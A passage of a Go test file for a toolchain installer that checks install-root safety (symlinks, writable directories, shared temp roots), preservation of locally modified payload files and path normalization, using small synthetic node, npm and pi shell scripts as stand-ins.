	if _, err := os.Lstat(missing); !os.IsNotExist(err) {
		t.Skipf("precondition: %s unexpectedly exists", missing)
	}
	if err := validateOwnedRoot(missing); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("a missing first component directly under the filesystem root must be rejected, got %v", err)
	}
}

// TestCreationParentFailsClosedWithoutMetadata proves a missing or nil
// creation-parent state is refused rather than treated as acceptable.
func TestCreationParentFailsClosedWithoutMetadata(t *testing.T) {
	uid := realUserID(t)
	if err := checkCreationParent("", nil, uid); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("an empty creation parent must fail closed, got %v", err)
	}
	child := filepath.Join(t.TempDir(), "child")
	if err := checkCreationParent(child, nil, uid); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("a nil creation-parent info must fail closed, got %v", err)
	}
}

// TestOwnershipAllowsPrivateTempRootCreation proves the narrow trusted
// root-owned sticky temp exception still permits creating a new private root
// beneath it after the filesystem-root initialization.
func TestOwnershipAllowsPrivateTempRootCreation(t *testing.T) {
	uid := realUserID(t)
	if uid == 0 {
		t.Skip("running as root makes the fake root-owned parent indistinguishable from the current user")
	}
	base := t.TempDir()
	tempRoot := filepath.Join(base, "tmp")
	if err := os.Mkdir(tempRoot, 0o700); err != nil {
		t.Fatalf("mkdir tempRoot: %v", err)
	}
	if err := os.Chmod(tempRoot, 0o777|os.ModeSticky); err != nil {
		t.Fatalf("chmod tempRoot: %v", err)
	}
	installOwnerSeam(t, uid, map[string]uint32{filepath.Clean(tempRoot): 0})
	trustedCreationRoots = func() []string { return []string{filepath.Clean(tempRoot)} }
	if err := validateOwnedRoot(filepath.Join(tempRoot, "ogs-private")); err != nil {
		t.Fatalf("a private root under a trusted sticky temp base must be allowed: %v", err)
	}
}

func TestPrepareRejectsGroupWritableInstallRoot(t *testing.T) {
	root := t.TempDir()
	if err := os.Chmod(root, 0o777); err != nil {
		t.Fatalf("chmod: %v", err)
	}
	t.Cleanup(func() { _ = os.Chmod(root, 0o700) })
	cfg := Config{WorkspaceDir: t.TempDir(), InstallRoot: root, Commands: &fakeRunner{}, Downloader: &fakeDownloader{}}
	if _, _, err := Prepare(context.Background(), cfg); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("a group/world-writable managed root must be rejected, got %v", err)
	}
}

func TestPrepareRejectsSymlinkedInstallRootAndAncestor(t *testing.T) {
	real := t.TempDir()
	linkParent := t.TempDir()
	link := filepath.Join(linkParent, "link")
	if err := os.Symlink(real, link); err != nil {
		t.Fatalf("symlink: %v", err)
	}
	cfg := Config{WorkspaceDir: t.TempDir(), InstallRoot: link, Commands: &fakeRunner{}, Downloader: &fakeDownloader{}}
	if _, _, err := Prepare(context.Background(), cfg); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("a symlinked install root must be rejected, got %v", err)
	}
	cfg.InstallRoot = filepath.Join(link, "ogs")
	if _, _, err := Prepare(context.Background(), cfg); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("an install root beneath a symlinked ancestor must be rejected, got %v", err)
	}
}

func TestPrepareRejectsExactSharedTempRoot(t *testing.T) {
	for _, root := range []string{"/tmp", "/var/tmp"} {
		t.Run(root, func(t *testing.T) {
			cfg := Config{WorkspaceDir: t.TempDir(), InstallRoot: root, Commands: &fakeRunner{}, Downloader: &fakeDownloader{}}
			if _, _, err := Prepare(context.Background(), cfg); !errors.Is(err, ErrUnsafeRoot) {
				t.Fatalf("exact shared temp root %q must be rejected, got %v", root, err)
			}
		})
	}
}

func TestConfiguredTmpdirCannotBypassSystemPrefixProtection(t *testing.T) {
	workspace := t.TempDir()
	t.Setenv("TMPDIR", "/usr")
	for _, root := range []string{"/usr", "/usr/local/ogs", "/usr/share/ogs"} {
		cfg := Config{WorkspaceDir: workspace, InstallRoot: root, Commands: &fakeRunner{}, Downloader: &fakeDownloader{}}
		if _, _, err := Prepare(context.Background(), cfg); !errors.Is(err, ErrUnsafeRoot) {
			t.Fatalf("a configured TMPDIR must not make %q acceptable, got %v", root, err)
		}
	}
}

func TestRejectedInstallRootHasNoEffects(t *testing.T) {
	root := t.TempDir()
	if err := os.Chmod(root, 0o777); err != nil {
		t.Fatalf("chmod: %v", err)
	}
	t.Cleanup(func() { _ = os.Chmod(root, 0o700) })
	runner := &fakeRunner{}
	downloader := &fakeDownloader{}
	cfg := Config{WorkspaceDir: t.TempDir(), InstallRoot: root, Commands: runner, Downloader: downloader}
	if _, _, err := Prepare(context.Background(), cfg); !errors.Is(err, ErrUnsafeRoot) {
		t.Fatalf("unsafe install root must be rejected, got %v", err)
	}
	if len(runner.calls) != 0 {
		t.Errorf("an unsafe root must be rejected before any command probe: %v", runner.calls)
	}
	if len(downloader.calls) != 0 {
		t.Errorf("an unsafe root must be rejected before any download: %v", downloader.calls)
	}
	assertDirEmpty(t, root)
}

func TestExecuteCreatesAndRevalidatesMissingOwnedRoot(t *testing.T) {
	harness := newInstallHarness(t, harnessOptions{})
	root := filepath.Join(t.TempDir(), "ogs-owned")
	if _, err := os.Lstat(root); !os.IsNotExist(err) {
		t.Fatalf("test precondition: %s must not exist", root)
	}
	cfg := harness.cfg
	cfg.InstallRoot = root
	_, plan, err := Prepare(context.Background(), cfg)
	if err != nil {
		t.Fatalf("Prepare for a missing owned root failed: %v", err)
	}
	report, err := Execute(context.Background(), cfg, plan, Consent{Approved: true, PlanFingerprint: plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if report.Failed {
		t.Fatalf("a missing owned root must be created and revalidated: %+v", report.Entries)
	}
	info, err := os.Stat(root)
	if err != nil || !info.IsDir() {
		t.Fatalf("owned root was not created: %v", err)
	}
	if info.Mode().Perm() != 0o700 {
		t.Errorf("created root mode = %#o, want 0700", info.Mode().Perm())
	}
}

func TestPayloadSymlinkedAncestorIsRejected(t *testing.T) {
	workspace := t.TempDir()
	outside := t.TempDir()
	if err := os.Symlink(outside, filepath.Join(workspace, ".pi")); err != nil {
		t.Fatalf("symlink: %v", err)
	}
	state := detectPayload(workspace)
	if state.Compatibility != CompatUnknown {
		t.Fatalf("symlinked payload ancestor must fail closed, got %s (%s)", state.Compatibility, state.Detail)
	}
	if _, err := installPayload(workspace); err == nil {
		t.Fatalf("installPayload must refuse a symlinked ancestor")
	}
	if _, err := os.Stat(filepath.Join(outside, "skills")); !os.IsNotExist(err) {
		t.Errorf("payload must not be written through the symlink")
	}
}

func TestPayloadFullyModifiedReportsUnverified(t *testing.T) {
	workspace := t.TempDir()
	destination := payloadDestination(workspace)
	for _, group := range ogsskills.Groups() {
		for _, rel := range group.Files {
			target := filepath.Join(destination, group.Dir, filepath.FromSlash(rel))
			if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
				t.Fatalf("mkdir: %v", err)
			}
			if err := os.WriteFile(target, []byte("# local edit "+group.Dir+"/"+rel+"\n"), 0o644); err != nil {
				t.Fatalf("seed modified %s/%s: %v", group.Dir, rel, err)
			}
		}
	}
	exec := &executor{cfg: Config{WorkspaceDir: workspace}}
	entry, stop := exec.installPayloadStep()
	if entry.Outcome != OutcomeUnverified {
		t.Fatalf("fully modified payload outcome = %s, want unverified", entry.Outcome)
	}
	if !stop {
		t.Fatalf("fully modified payload must report partial status")
	}
	for _, group := range ogsskills.Groups() {
		for _, rel := range group.Files {
			data, err := os.ReadFile(filepath.Join(destination, group.Dir, filepath.FromSlash(rel)))
			if err != nil {
				t.Fatalf("read preserved %s/%s: %v", group.Dir, rel, err)
			}
			if !strings.HasPrefix(string(data), "# local edit") {
				t.Errorf("payload file %s/%s was overwritten", group.Dir, rel)
			}
		}
	}
}

// TestPayloadModifiedFileKeepsAggregateUnverified pins the F1 truthfulness
// contract: whenever any required embedded payload file differs and is
// preserved, the aggregate outcome is unverified and the plan stops, even when
// sibling files were installed successfully or are already byte-identical.
// Local modified bytes are never overwritten and the per-file report stays
// accurate for both embedded groups.
func TestPayloadModifiedFileKeepsAggregateUnverified(t *testing.T) {
	cases := []struct {
		name          string
		seedIdentical bool
	}{
		{name: "modified entry with other files missing", seedIdentical: false},
		{name: "modified entry with other files identical", seedIdentical: true},
	}
	totalFiles := len(ogsskills.RelativePaths())
	for _, group := range ogsskills.Groups() {
		group := group
		for _, tc := range cases {
			tc := tc
			t.Run(group.Dir+"/"+tc.name, func(t *testing.T) {
				workspace := t.TempDir()
				destination := payloadDestination(workspace)
				modifiedRel := group.Files[0]
				// The product aggregates the whole embedded payload, not one group,
				// so the identical case seeds every other declared file across all
				// groups. Only the exact modified identity stays untouched.
				if tc.seedIdentical {
					for _, other := range ogsskills.Groups() {
						for _, rel := range other.Files {
							if other.Dir == group.Dir && rel == modifiedRel {
								continue
							}
							embedded, err := ogsskills.ReadGroupFile(other.Dir, rel)
							if err != nil {
								t.Fatalf("ReadGroupFile %s/%s: %v", other.Dir, rel, err)
							}
							target := filepath.Join(destination, other.Dir, filepath.FromSlash(rel))
							if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
								t.Fatalf("mkdir %s: %v", filepath.Dir(target), err)
							}
							if err := os.WriteFile(target, embedded, 0o644); err != nil {
								t.Fatalf("seed identical %s/%s: %v", other.Dir, rel, err)
							}
						}
					}
				}
				modified := []byte("# local edit for " + group.Dir + "/" + modifiedRel + "\n")
				modifiedTarget := filepath.Join(destination, group.Dir, filepath.FromSlash(modifiedRel))
				if err := os.MkdirAll(filepath.Dir(modifiedTarget), 0o755); err != nil {
					t.Fatalf("mkdir modified: %v", err)
				}
				if err := os.WriteFile(modifiedTarget, modified, 0o644); err != nil {
					t.Fatalf("seed modified %s/%s: %v", group.Dir, modifiedRel, err)
				}

				exec := &executor{cfg: Config{WorkspaceDir: workspace}}
				entry, stop := exec.installPayloadStep()

				if entry.Outcome != OutcomeUnverified {
					t.Fatalf("outcome = %s, want unverified for a preserved modified file", entry.Outcome)
				}
				if !stop {
					t.Fatalf("a preserved modified file must stop the plan")
				}
				if !strings.Contains(entry.Detail, "preserved") {
					t.Errorf("detail must disclose preserved files: %q", entry.Detail)
				}

				statuses := map[string]string{}
				for _, file := range exec.report.Payload.Files {
					statuses[file.RelativePath] = file.Status
				}
				if len(exec.report.Payload.Files) != totalFiles {
					t.Errorf("payload report has %d file(s), want %d declared", len(exec.report.Payload.Files), totalFiles)
				}
				if statuses[group.Dir+"/"+modifiedRel] != PayloadPreserved {
					t.Errorf("modified %s/%s status = %q, want preserved", group.Dir, modifiedRel, statuses[group.Dir+"/"+modifiedRel])
				}

				identicalCount, installedCount := 0, 0
				for _, other := range ogsskills.Groups() {
					for _, rel := range other.Files {
						if other.Dir == group.Dir && rel == modifiedRel {
							continue
						}
						status, ok := statuses[other.Dir+"/"+rel]
						if !ok {
							t.Errorf("payload report is missing %s/%s", other.Dir, rel)
							continue
						}
						if tc.seedIdentical {
							if status != PayloadIdentical {
								t.Errorf("unchanged %s/%s status = %q, want identical", other.Dir, rel, status)
							}
							identicalCount++
							continue
						}
						if status != PayloadInstalled {
							t.Errorf("missing %s/%s status = %q, want installed", other.Dir, rel, status)
						}
						installedCount++
					}
				}

				if tc.seedIdentical {
					if identicalCount != totalFiles-1 {
						t.Fatalf("fixture must exercise %d identical file(s), got %d", totalFiles-1, identicalCount)
					}
					if installedCount != 0 {
						t.Errorf("identical fixture must install nothing, got %d installed", installedCount)
					}
					// The diagnostic must count the identical files instead of claiming
					// that every embedded file differs.
					if !strings.Contains(entry.Detail, fmt.Sprintf("%d identical", identicalCount)) {
						t.Errorf("detail must report %d identical file(s), got %q", identicalCount, entry.Detail)
					}
					if strings.Contains(entry.Detail, "all ") {
						t.Errorf("detail must not claim every embedded file differs: %q", entry.Detail)
					}
				} else {
					if installedCount != totalFiles-1 {
						t.Fatalf("fixture must exercise %d missing file(s), got %d", totalFiles-1, installedCount)
					}
					if !strings.Contains(entry.Detail, fmt.Sprintf("%d embedded payload file(s) were installed", installedCount)) {
						t.Errorf("detail must report %d installed file(s), got %q", installedCount, entry.Detail)
					}
				}

				preserved, err := os.ReadFile(modifiedTarget)
				if err != nil {
					t.Fatalf("read preserved %s/%s: %v", group.Dir, modifiedRel, err)
				}
				if string(preserved) != string(modified) {
					t.Errorf("modified %s/%s bytes were overwritten", group.Dir, modifiedRel)
				}
			})
		}
	}
}

// hybridRunner exercises the production ExecRunner for selected specs while
// keeping detection and package listing deterministic. It is used by the
// synthetic-toolchain test below.
type hybridRunner struct {
	paths   map[string]string
	lookErr map[string]error
	real    ExecRunner
	realFn  func(CommandSpec) bool
	runFn   func(CommandSpec) CommandResult
}

func (h *hybridRunner) LookPath(name string) (string, error) {
	if path, ok := h.paths[name]; ok {
		return path, nil
	}
	if err, ok := h.lookErr[name]; ok {
		return "", err
	}
	return "", fmt.Errorf("%s: not found", name)
}

func (h *hybridRunner) Run(ctx context.Context, spec CommandSpec) CommandResult {
	if h.realFn != nil && h.realFn(spec) {
		return h.real.Run(ctx, spec)
	}
	if h.runFn != nil {
		return h.runFn(spec)
	}
	return CommandResult{}
}

func writeExecutable(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", filepath.Dir(path), err)
	}
	if err := os.WriteFile(path, []byte(content), 0o755); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

const syntheticNodeScript = `#!/bin/sh
if [ "$1" = "--version" ]; then
  echo v24.21.0
  exit 0
fi
echo 0.87.1
`

const syntheticNpmScript = `#!/bin/sh
if [ "$1" = "--version" ]; then
  echo 11.19.0
  exit 0
fi
prefix=""
prev=""
for arg in "$@"; do
  if [ "$prev" = "--prefix" ]; then
    prefix="$arg"
  fi
  prev="$arg"
done
mkdir -p "$prefix/bin"
printf '#!/usr/bin/env node\n' > "$prefix/bin/pi"
chmod +x "$prefix/bin/pi"
echo "added 1 package"
`

// TestManagedPiVerificationUsesManagedRuntimePath exercises the production
// ExecRunner with a real synthetic, PATH-sensitive toolchain: the managed Pi is
// a `#!/usr/bin/env node` launcher backed only by a synthetic node helper in the
// managed bin directory. It covers both the post-npm verification and the
// initial managed-Pi reuse on a second run, and proves the launcher cannot run
// from a host PATH without the managed Node.
func TestManagedPiVerificationUsesManagedRuntimePath(t *testing.T) {
	installRoot := t.TempDir()
	workspace := t.TempDir()
	managedNodeBin := filepath.Join(installRoot, "node", "24.21.0", "bin")
	managedNode := filepath.Join(managedNodeBin, "node")
	managedNpm := filepath.Join(managedNodeBin, "npm")
	managedEngram := filepath.Join(installRoot, "engram", "2.2.0", "engram")
	managedPi := filepath.Join(installRoot, "pi", "0.87.1", "bin", "pi")

	writeExecutable(t, managedNode, syntheticNodeScript)
	writeExecutable(t, managedNpm, syntheticNpmScript)

	installed := map[string]bool{}
	runner := &hybridRunner{
		paths:   map[string]string{"node": managedNode, "npm": managedNpm, "engram": managedEngram},
		lookErr: map[string]error{},
		real:    ExecRunner{},
		runFn: func(spec CommandSpec) CommandResult {
			base := filepath.Base(spec.Name)
			joined := strings.Join(spec.Args, " ")
			switch {
			case base == "node" && joined == "--version":
				return CommandResult{Stdout: "v24.21.0\n"}
			case base == "npm" && joined == "--version":
				return CommandResult{Stdout: "11.19.0\n"}
			case base == "pi" && joined == "--version":
				return CommandResult{Stdout: "0.87.1\n"}
			case base == "pi" && joined == "list --no-approve":
				return packageListResult(installed)
			case base == "pi" && len(spec.Args) > 0 && spec.Args[0] == "install":
				installed[spec.Args[1]] = true
				return CommandResult{Stdout: "Installed " + spec.Args[1] + "\n"}
			case base == "engram" && joined == "--version":
				return CommandResult{Stdout: "engram version 2.2.0\n"}
			}
			return CommandResult{ExitCode: 127, Stderr: "unexpected command: " + base + " " + joined}
		},
	}
	// Only the managed Pi version probe and the npm install are delegated to the
	// production ExecRunner; detection and `pi list`/`pi install` stay fake.
	runner.realFn = func(spec CommandSpec) bool {
		if spec.Name == managedPi && len(spec.Args) == 1 && spec.Args[0] == "--version" {
			return true
		}
		return filepath.Base(spec.Name) == "npm" && len(spec.Args) > 0 && spec.Args[0] == "install"
	}

	cfg := Config{WorkspaceDir: workspace, InstallRoot: installRoot, Commands: runner, Downloader: &fakeDownloader{}}
	_, plan, err := Prepare(context.Background(), cfg)
	if err != nil {
		t.Fatalf("Prepare failed: %v", err)
	}
	if plan.Blocked() {
		t.Fatalf("plan unexpectedly blocked: %+v", plan.Steps)
	}

	report, err := Execute(context.Background(), cfg, plan, Consent{Approved: true, PlanFingerprint: plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if report.Failed {
		t.Fatalf("report failed: %+v", report.Entries)
	}
	outcomes := map[Component]Outcome{}
	for _, entry := range report.Entries {
		outcomes[entry.Component] = entry.Outcome
	}
	if outcomes[ComponentPi] != OutcomeInstalled {
		t.Fatalf("Pi outcome = %s, want installed", outcomes[ComponentPi])
	}
	if _, err := os.Stat(managedPi); err != nil {
		t.Fatalf("synthetic managed Pi missing: %v", err)
	}

	// Negative control: the same launcher cannot produce a version when the
	// managed node bin is absent from the child PATH.
	emptyBin := t.TempDir()
	neg := ExecRunner{}.Run(context.Background(), CommandSpec{
		Name: managedPi,
		Args: []string{"--version"},
		Env:  []string{"PATH=" + emptyBin},
	})
	if neg.ExitCode == 0 && strings.Contains(neg.Stdout, "0.87.1") {
		t.Fatalf("the synthetic Pi launcher must not run without the managed Node on PATH: %+v", neg)
	}

	// Second run exercises the initial managed-Pi reuse probe with ExecRunner.
	_, plan2, err := Prepare(context.Background(), cfg)
	if err != nil {
		t.Fatalf("second Prepare failed: %v", err)
	}
	second, err := Execute(context.Background(), cfg, plan2, Consent{Approved: true, PlanFingerprint: plan2.Fingerprint()})
	if err != nil || second.Failed {
		t.Fatalf("second execute failed: err=%v report=%+v", err, second.Entries)
	}
	outcomes = map[Component]Outcome{}
	for _, entry := range second.Entries {
		outcomes[entry.Component] = entry.Outcome
	}
	if outcomes[ComponentPi] != OutcomeReused {
		t.Fatalf("second run Pi outcome = %s, want reused", outcomes[ComponentPi])
	}
}

// TestExecuteNormalizesRootForAllIOAndStaging proves the approved root is
// normalized once for actual execution, not only for the fingerprint. The raw
// config path retains its literal "alias/.." traversal, so it really differs
// from its lexical clean: it lexically cleans to base/installRoot but physically
// resolves into base/decoy/installRoot because the alias component is a symlink.
// Every download staging location must land directly under the approved lexical
// root, the decoy root must stay empty even while a download is in flight, and
// the decoy sentinel must stay untouched.
func TestExecuteNormalizesRootForAllIOAndStaging(t *testing.T) {
	base := t.TempDir()
	decoy := filepath.Join(base, "decoy")
	deeper := filepath.Join(decoy, "deeper")
	if err := os.MkdirAll(deeper, 0o700); err != nil {
		t.Fatalf("mkdir decoy: %v", err)
	}
	alias := filepath.Join(base, "alias")
	if err := os.Symlink(deeper, alias); err != nil {
		t.Fatalf("symlink alias: %v", err)
	}
	// Create both parents the fixture could resolve to: the lexical approved root
	// and the decoy root reached through the alias, plus a sentinel that proves
	// nothing unrelated is touched.
	wanted := filepath.Join(base, "installRoot")
	decoyRoot := filepath.Join(decoy, "installRoot")
	for _, dir := range []string{wanted, decoyRoot} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatalf("mkdir %s: %v", dir, err)
		}
	}
	sentinel := filepath.Join(decoy, "sentinel")
	if err := os.WriteFile(sentinel, []byte("keep"), 0o600); err != nil {
		t.Fatalf("write sentinel: %v", err)
	}
	// Retain the literal "alias/.." so the raw config string actually differs from
	// its lexical clean. filepath.Join would erase the traversal before Execute
	// ever sees it, which is exactly the gap this fixture must not have.
	rawRoot := strings.Join([]string{base, "alias", "..", "installRoot"}, string(os.PathSeparator))
	if rawRoot == filepath.Clean(rawRoot) {
		t.Fatalf("fixture must retain a raw traversal: raw=%q clean=%q", rawRoot, filepath.Clean(rawRoot))
	}
	// Physically the raw path lands under the alias target, not the lexical
	// approved root, because ".." resolves after the symlinked alias component.
	physical, err := filepath.EvalSymlinks(rawRoot)
	if err != nil {
		t.Fatalf("EvalSymlinks(%q): %v", rawRoot, err)
	}
	if physical == wanted {
		t.Fatalf("fixture must resolve physically away from the lexical root: physical=%q wanted=%q", physical, wanted)
	}

	harness := newInstallHarness(t, harnessOptions{installRoot: rawRoot})
	if harness.cfg.InstallRoot != rawRoot {
		t.Fatalf("Execute must receive the raw root unchanged: got %q want %q", harness.cfg.InstallRoot, rawRoot)
	}
	recorder := &recordingDownloader{
		inner: harness.downloader,
		onDownload: func(destPath string) {
			// Inspect the decoy root during execution, before deferred cleanup can
			// hide a temporary directory staged under the wrong physical root.
			entries, err := os.ReadDir(decoyRoot)
			if err != nil {
				t.Errorf("read decoy root during download: %v", err)
				return
			}
			if len(entries) != 0 {
				t.Errorf("raw staging leaked into the decoy root during %s: %v", destPath, entries)
			}
		},
	}
	harness.cfg.Downloader = recorder

	report, err := Execute(context.Background(), harness.cfg, harness.plan, Consent{Approved: true, PlanFingerprint: harness.plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if report.Failed {
		t.Fatalf("normal flow must succeed under a normalized alias root: %+v", report.Entries)
	}
	if len(recorder.dests) == 0 {
		t.Fatalf("expected the downloader to observe at least one staging destination")
	}
	for _, dest := range recorder.dests {
		stage := filepath.Dir(dest)
		if filepath.Dir(stage) != wanted {
			t.Errorf("staging %s is not directly under the approved normalized root %s", stage, wanted)
		}
	}
	if entries, err := os.ReadDir(decoyRoot); err != nil {
		t.Errorf("read decoy root: %v", err)
	} else if len(entries) != 0 {
		t.Errorf("IO must not stage under the symlinked decoy tree: %v", entries)
	}
	if data, err := os.ReadFile(sentinel); err != nil || string(data) != "keep" {
		t.Errorf("unrelated fixture sentinel was touched: data=%q err=%v", data, err)
	}
	if entries, err := os.ReadDir(wanted); err != nil {
		t.Errorf("approved normalized root was not created: %v", err)
	} else if len(entries) == 0 {
		t.Errorf("approved normalized root stayed empty; managed IO did not write there")
	}
}

// TestWithDefaultsNormalizesExecutionPaths proves the config consumed by
// Detect/BuildPlan/Execute is normalized by the same helper as the approved
// binding: cleaned, whitespace-trimmed paths, with empty optional paths staying
// empty instead of collapsing to the current directory.
func TestWithDefaultsNormalizesExecutionPaths(t *testing.T) {
	raw := Config{
		WorkspaceDir: "  /home/user/ws/../workspace  ",
		InstallRoot:  "/home/user/root/./nested/..",
		NodePath:     "  /usr/local/../bin/node  ",
	}
	defaulted := raw.withDefaults()
	if defaulted.WorkspaceDir != "/home/user/workspace" {
		t.Errorf("WorkspaceDir = %q, want normalized", defaulted.WorkspaceDir)
	}
	if defaulted.InstallRoot != "/home/user/root" {
		t.Errorf("InstallRoot = %q, want normalized", defaulted.InstallRoot)
	}
	if defaulted.NodePath != "/usr/bin/node" {
		t.Errorf("NodePath = %q, want normalized", defaulted.NodePath)
	}
	if defaulted.NpmPath != "" || defaulted.PiPath != "" || defaulted.EngramPath != "" || defaulted.GodotPath != "" {
		t.Errorf("empty optional paths must stay empty: %+v", defaulted)
	}
	binding := raw.planBinding()
	if binding.InstallRoot != defaulted.InstallRoot || binding.WorkspaceDir != defaulted.WorkspaceDir || binding.NodePath != defaulted.NodePath {
		t.Errorf("binding %+v must agree with the normalized config %+v", binding, defaulted)
	}
}

const syntheticHostNodeScript = `#!/bin/sh
if [ "$1" = "--version" ]; then
  echo v24.21.0
  exit 0
fi
exit 1
`

// syntheticProviderNodeScript reports a distinct but still acceptable version so
// a wrong-NODE-lookup bug is observable: npm fails if the provider bundle's Node
// shadows the selected host Node.
const syntheticProviderNodeScript = `#!/bin/sh
if [ "$1" = "--version" ]; then
  echo v24.99.0
  exit 0
fi
exit 1
`

// syntheticProviderNpmScript models Pi's real package-manager behavior: npm is a
// PATH-resolved tool that runs under whatever `node` is first on PATH. It fails
// loudly if the wrong Node is resolved.
const syntheticProviderNpmScript = `#!/bin/sh
if [ "$1" = "--version" ]; then
  echo 11.19.0
  exit 0
fi
if [ "$1" = "install" ]; then
  resolved="$(node --version 2>/dev/null)"
  if [ "$resolved" != "v24.21.0" ]; then
    echo "npm resolved the wrong Node: $resolved" >&2
    exit 1
  fi
  echo "added 1 package"
  exit 0
fi
exit 127
`

// syntheticPiScript returns a Pi launcher that records package installs in a
// state file. Its install branch spawns `npm` by PATH, exactly like the public
// Pi package manager, so it exposes whether Pi can still find npm at runtime.
func syntheticPiScript(stateFile string) string {
	return `#!/bin/sh
STATE="` + stateFile + `"
case "$1" in
  --version) echo 0.87.1; exit 0 ;;
  list)
    if [ ! -s "$STATE" ]; then
      echo "No packages installed."
      exit 0
    fi
    echo "User packages:"
    while IFS= read -r src; do
      echo "  $src"
    done < "$STATE"
    exit 0
    ;;
  install)
    if ! command -v npm >/dev/null 2>&1; then
      echo "npm: command not found" >&2
      exit 127
    fi
    if ! npm install "$2" >/dev/null 2>&1; then
      echo "npm install failed" >&2
      exit 1
    fi
    printf '%s\n' "$2" >> "$STATE"
    echo "Installed $2"
    exit 0
    ;;
esac
exit 127
`
}

// TestPiPackageInstallFindsProviderNpmOnPath runs the production ExecRunner with
// a synthetic Pi that actually spawns `npm` by PATH during package install. It
// fails if the npm-provider bin directory is missing from Pi's PATH (Pi cannot
// find npm) or if the provider's Node shadows the selected host Node (npm
// resolves the wrong Node). It also checks the reported launch info and the
// default second-run reuse behavior.
func TestPiPackageInstallFindsProviderNpmOnPath(t *testing.T) {
	installRoot := t.TempDir()
	workspace := t.TempDir()
	fixtures := t.TempDir()

	hostBin := filepath.Join(fixtures, "host-bin")
	hostNode := filepath.Join(hostBin, "node")
	writeExecutable(t, hostNode, syntheticHostNodeScript)
	// Keep the inherited PATH fixture-only so the synthetic Pi can never resolve a
	// real vendor node/npm through the process environment.
	t.Setenv("PATH", hostBin)

	piState := filepath.Join(fixtures, "pi-packages.txt")
	piBin := filepath.Join(fixtures, "pi")
	writeExecutable(t, piBin, syntheticPiScript(piState))

	nodeArchive := filepath.Join(fixtures, "provider-node.tar.gz")
	writeTarGz(t, nodeArchive, []tarEntry{
		{name: "node-v24.21.0-linux-x64/bin/node", mode: 0o755, typeflag: tar.TypeReg, data: []byte(syntheticProviderNodeScript)},
		{name: "node-v24.21.0-linux-x64/bin/npm", mode: 0o755, typeflag: tar.TypeReg, data: []byte(syntheticProviderNpmScript)},
	})
	nodeCandidate, _ := CandidateFor(ComponentNode)
	downloader := &fakeDownloader{files: map[string]string{nodeCandidate.Source: nodeArchive}}

	runner := &hybridRunner{
		paths: map[string]string{"node": hostNode, "pi": piBin, "engram": filepath.Join(fixtures, "engram")},
		real:  ExecRunner{},
		runFn: func(spec CommandSpec) CommandResult {
			if filepath.Base(spec.Name) == "engram" && strings.Join(spec.Args, " ") == "--version" {
				return CommandResult{Stdout: "engram version 2.2.0\n"}
			}
			return CommandResult{ExitCode: 127, Stderr: "unexpected fake command: " + spec.Name}
		},
	}
	// Node, npm, and Pi all run through the production ExecRunner; only Engram's
	// version probe stays deterministic.
	runner.realFn = func(spec CommandSpec) bool {
		switch filepath.Base(spec.Name) {
		case "node", "npm", "pi":
			return true
		default:
			return false
		}
	}

	cfg := Config{
		WorkspaceDir: workspace,
		InstallRoot:  installRoot,
		Commands:     runner,
		Downloader:   downloader,
		archiveDigests: map[Component]archiveDigestOverride{
			ComponentNode: {sha: digestOf(t, nodeArchive), size: fileSizeOf(t, nodeArchive)},
		},
	}
	_, plan, err := Prepare(context.Background(), cfg)
	if err != nil {
		t.Fatalf("Prepare failed: %v", err)
	}
	if plan.Blocked() {
		t.Fatalf("plan unexpectedly blocked: %+v", plan.Steps)
	}

	// The detection PATH must never accidentally find a real vendor Node/npm/Pi:
	// npm stays absent by construction, forcing the owned npm provider.
	providerNpm := filepath.Join(installRoot, "node", "24.21.0", "bin", "npm")

	report, err := Execute(context.Background(), cfg, plan, Consent{Approved: true, PlanFingerprint: plan.Fingerprint()})
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if report.Failed {
		t.Fatalf("Pi must find the provider npm on PATH; report failed: %+v", report.Entries)
	}
	outcomes := map[Component]Outcome{}
	for _, entry := range report.Entries {
		outcomes[entry.Component] = entry.Outcome
	}
	for _, component := range []Component{ComponentNpm, ComponentShell, ComponentEngramCompanion} {
		if outcomes[component] != OutcomeInstalled && outcomes[component] != OutcomeReused {
			t.Errorf("%s outcome = %s, want installed or reused", component, outcomes[component])
		}
	}
	if report.Launch.NodeBinDir != hostBin {
		t.Errorf("Launch.NodeBinDir = %q, want the selected host Node bin %q", report.Launch.NodeBinDir, hostBin)
	}
	if report.Launch.NpmExecutable != providerNpm {
		t.Errorf("Launch.NpmExecutable = %q, want the owned npm provider %q", report.Launch.NpmExecutable, providerNpm)
	}
	downloadsAfterFirst := len(downloader.calls)
	if downloadsAfterFirst == 0 {
		t.Fatalf("expected the npm provider bundle to be downloaded once")
	}

	_, secondPlan, err := Prepare(context.Background(), cfg)
	if err != nil {
		t.Fatalf("second Prepare failed: %v", err)
	}
	second, err := Execute(context.Background(), cfg, secondPlan, Consent{Approved: true, PlanFingerprint: secondPlan.Fingerprint()})
	if err != nil {
		t.Fatalf("second Execute returned error: %v", err)
	}
	if second.Failed {
		t.Fatalf("second run must reuse the managed state: %+v", second.Entries)
	}
	if len(downloader.calls) != downloadsAfterFirst {
		t.Errorf("second run re-downloaded archives: before=%v after=%v", downloadsAfterFirst, downloader.calls)
	}
	if second.Launch.NodeBinDir != hostBin {
		t.Errorf("second run Launch.NodeBinDir = %q, want the selected host Node bin %q", second.Launch.NodeBinDir, hostBin)
	}
	if second.Launch.NpmExecutable != providerNpm {
		t.Errorf("second run Launch.NpmExecutable = %q, want the owned npm provider %q", second.Launch.NpmExecutable, providerNpm)
	}
	secondOutcomes := map[Component]Outcome{}
	for _, entry := range second.Entries {
		secondOutcomes[entry.Component] = entry.Outcome
